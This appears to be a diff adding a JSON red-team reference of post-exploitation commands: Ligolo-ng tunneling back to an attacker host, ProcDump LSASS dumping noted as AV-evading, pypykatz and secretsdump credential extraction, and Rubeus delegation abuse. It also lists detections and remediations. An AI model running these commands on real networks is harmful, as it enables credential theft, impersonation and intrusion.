@@ -1,0 +1,312 @@
+[
+  {
+    "id": "ligolo-setup",
+    "tool": "ligolo-ng",
+    "category": "post_exploitation",
+    "phase": 6,
+    "os": [
+      "linux",
+      "windows"
+    ],
+    "command": "# Proxy (attacker): sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up\n# Start: ligolo-proxy -selfcert\n# Agent: ligolo-agent -connect <attacker>:11601 -ignore-cert",
+    "name": "Ligolo-ng Full Setup",
+    "description": "Complete Ligolo-ng setup for transparent network pivoting \u2014 no SOCKS needed.",
+    "arguments": {
+      "ip tuntap add": "Create TUN interface",
+      "ligolo-proxy": "Start proxy",
+      "ligolo-agent": "Run on target"
+    },
+    "expected_output": "[+] Agent joined: agent@target\n>> session\n>> ifconfig\n>> start",
+    "use_case": "Best pivoting tool \u2014 adds target's network as a route, no proxychains needed.",
+    "prerequisites": [
+      "TUN interface support",
+      "Agent on target"
+    ],
+    "mitre_mapping": [
+      "T1572"
+    ],
+    "mitre_tactic": "Command and Control",
+    "detections": [
+      "TLS connections to unusual ports",
+      "New network routes"
+    ],
+    "remediation": [
+      "Egress filtering",
+      "Monitor for tunneling"
+    ],
+    "common_mistakes": [
+      "Not adding route (ip route add <net> dev ligolo)"
+    ],
+    "alternatives": [
+      "chisel",
+      "ssh -D"
+    ],
+    "references": [
+      "https://github.com/nicocha30/ligolo-ng"
+    ],
+    "tags": [
+      "ligolo",
+      "pivoting",
+      "transparent",
+      "tunnel",
+      "setup"
+    ]
+  },
+  {
+    "id": "procdump-lsass",
+    "tool": "procdump",
+    "category": "post_exploitation",
+    "phase": 6,
+    "os": [
+      "windows"
+    ],
+    "command": "procdump.exe -accepteula -ma lsass.exe lsass.dmp",
+    "name": "Dump LSASS with ProcDump",
+    "description": "Uses Microsoft's legitimate ProcDump to dump LSASS memory \u2014 less likely to be flagged by AV.",
+    "arguments": {
+      "-accepteula": "Accept EULA",
+      "-ma": "Full memory dump",
+      "lsass.exe": "Target process"
+    },
+    "expected_output": "[*] Dump 1 initiated: lsass.dmp\n[*] Dump 1 complete: 45 MB written",
+    "use_case": "Dump LSASS using a signed Microsoft tool \u2014 bypasses some AV/EDR.",
+    "prerequisites": [
+      "Admin/SYSTEM privileges",
+      "ProcDump on target"
+    ],
+    "mitre_mapping": [
+      "T1003.001"
+    ],
+    "mitre_tactic": "Credential Access",
+    "detections": [
+      "LSASS memory access",
+      "ProcDump execution"
+    ],
+    "remediation": [
+      "Credential Guard",
+      "PPL for LSASS",
+      "Monitor LSASS access"
+    ],
+    "common_mistakes": [
+      "Credential Guard enabled",
+      "EDR still detects"
+    ],
+    "alternatives": [
+      "comsvcs.dll MiniDump",
+      "nanodump",
+      "pypykatz (parse offline)"
+    ],
+    "references": [
+      "https://learn.microsoft.com/en-us/sysinternals/downloads/procdump"
+    ],
+    "tags": [
+      "lsass",
+      "dump",
+      "procdump",
+      "credentials",
+      "evasion"
+    ]
+  },
+  {
+    "id": "pypykatz-offline",
+    "tool": "pypykatz",
+    "category": "post_exploitation",
+    "phase": 6,
+    "os": [
+      "linux"
+    ],
+    "command": "pypykatz lsa minidump lsass.dmp",
+    "name": "Parse LSASS Dump Offline",
+    "description": "Parses LSASS memory dumps on Linux \u2014 extract credentials without running mimikatz on target.",
+    "arguments": {
+      "lsa minidump": "Parse minidump format",
+      "lsass.dmp": "Dump file"
+    },
+    "expected_output": "== NTLM ==\nUsername: Administrator\nNT: fc525c9683e8fe067095ba2ddc971889",
+    "use_case": "Extract credentials from LSASS dumps on your Linux attack machine.",
+    "prerequisites": [
+      "LSASS dump file transferred to attacker"
+    ],
+    "mitre_mapping": [
+      "T1003.001"
+    ],
+    "mitre_tactic": "Credential Access",
+    "detections": [
+      "N/A \u2014 offline analysis"
+    ],
+    "remediation": [
+      "Credential Guard",
+      "Don't leave dumps accessible"
+    ],
+    "common_mistakes": [
+      "Wrong dump format"
+    ],
+    "alternatives": [
+      "mimikatz (on Windows)",
+      "secretsdump"
+    ],
+    "references": [
+      "https://github.com/skelsec/pypykatz"
+    ],
+    "tags": [
+      "lsass",
+      "offline",
+      "parse",
+      "linux",
+      "credentials"
+    ]
+  },
+  {
+    "id": "sharphound-acl",
+    "tool": "bloodhound",
+    "category": "post_exploitation",
+    "phase": 6,
+    "os": [
+      "windows"
+    ],
+    "command": "# In BloodHound: Analytics \u2192 Find Principals with DCSync Rights\n# Or: MATCH (n)-[:MemberOf*1..]->(g:Group)-[:DCSync]->(d:Domain) RETURN n",
+    "name": "BloodHound ACL Analysis",
+    "description": "Uses BloodHound to find dangerous ACL permissions \u2014 GenericAll, WriteDACL, DCSync rights.",
+    "arguments": {
+      "Cypher query": "Custom graph query",
+      "Analytics": "Built-in queries"
+    },
+    "expected_output": "Path: helpdesk_user \u2192 GenericAll \u2192 Domain Admins group",
+    "use_case": "Find ACL-based attack paths that don't require exploits \u2014 just permission abuse.",
+    "prerequisites": [
+      "BloodHound data collected"
+    ],
+    "mitre_mapping": [
+      "T1069"
+    ],
+    "mitre_tactic": "Discovery",
+    "detections": [
+      "N/A \u2014 offline analysis"
+    ],
+    "remediation": [
+      "Audit ACLs regularly",
+      "Remove unnecessary permissions"
+    ],
+    "common_mistakes": [
+      "Not checking custom queries"
+    ],
+    "alternatives": [
+      "aclpwn",
+      "PowerView Get-DomainObjectAcl"
+    ],
+    "references": [
+      "https://bloodhound.specterops.io"
+    ],
+    "tags": [
+      "acl",
+      "permissions",
+      "attack-path",
+      "bloodhound"
+    ]
+  },
+  {
+    "id": "rubeus-s4u",
+    "tool": "rubeus",
+    "category": "post_exploitation",
+    "phase": 6,
+    "os": [
+      "windows"
+    ],
+    "command": "Rubeus.exe s4u /user:svc_sql /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/target /ptt",
+    "name": "Constrained Delegation Abuse",
+    "description": "Abuses constrained delegation to impersonate any user to the delegated service.",
+    "arguments": {
+      "/user": "Service account",
+      "/rc4": "Account hash",
+      "/impersonateuser": "Target user",
+      "/msdsspn": "Delegated SPN",
+      "/ptt": "Inject ticket"
+    },
+    "expected_output": "[+] TGS for administrator@corp.local to cifs/target\n[+] Ticket injected",
+    "use_case": "Impersonate Domain Admin to specific services via constrained delegation.",
+    "prerequisites": [
+      "Service account hash",
+      "Constrained delegation configured"
+    ],
+    "mitre_mapping": [
+      "T1550"
+    ],
+    "mitre_tactic": "Lateral Movement",
+    "detections": [
+      "S4U2Self/S4U2Proxy requests",
+      "Unusual service ticket requests"
+    ],
+    "remediation": [
+      "Audit delegation settings",
+      "Use RBCD instead",
+      "Monitor S4U requests"
+    ],
+    "common_mistakes": [
+      "Delegation not configured on account"
+    ],
+    "alternatives": [
+      "impacket-getST"
+    ],
+    "references": [
+      "https://github.com/GhostPack/Rubeus"
+    ],
+    "tags": [
+      "delegation",
+      "s4u",
+      "impersonation",
+      "kerberos",
+      "lateral"
+    ]
+  },
+  {
+    "id": "secretsdump-local",
+    "tool": "impacket",
+    "category": "post_exploitation",
+    "phase": 6,
+    "os": [
+      "linux"
+    ],
+    "command": "impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL",
+    "name": "Offline SAM/SYSTEM Extraction",
+    "description": "Extracts hashes from saved SAM/SYSTEM/SECURITY registry hives offline.",
+    "arguments": {
+      "-sam SAM": "SAM hive file",
+      "-system SYSTEM": "SYSTEM hive",
+      "-security SECURITY": "SECURITY hive",
+      "LOCAL": "Process locally"
+    },
+    "expected_output": "Administrator:500:aad3b435...:fc525c96...:::\nGuest:501:aad3b435...:...:::",
+    "use_case": "Extract hashes from registry hive backups without touching the live system.",
+    "prerequisites": [
+      "SAM, SYSTEM, SECURITY files (from reg save or backup)"
+    ],
+    "mitre_mapping": [
+      "T1003.002"
+    ],
+    "mitre_tactic": "Credential Access",
+    "detections": [
+      "N/A \u2014 offline"
+    ],
+    "remediation": [
+      "Protect registry backups",
+      "Encrypt backup media"
+    ],
+    "common_mistakes": [
+      "Files not from same machine (different boot key)"
+    ],
+    "alternatives": [
+      "mimikatz lsadump::sam",
+      "samdump2"
+    ],
+    "references": [
+      "https://github.com/fortra/impacket"
+    ],
+    "tags": [
+      "sam",
+      "offline",
+      "registry",
+      "hives",
+      "extraction"
+    ]
+  }
+]
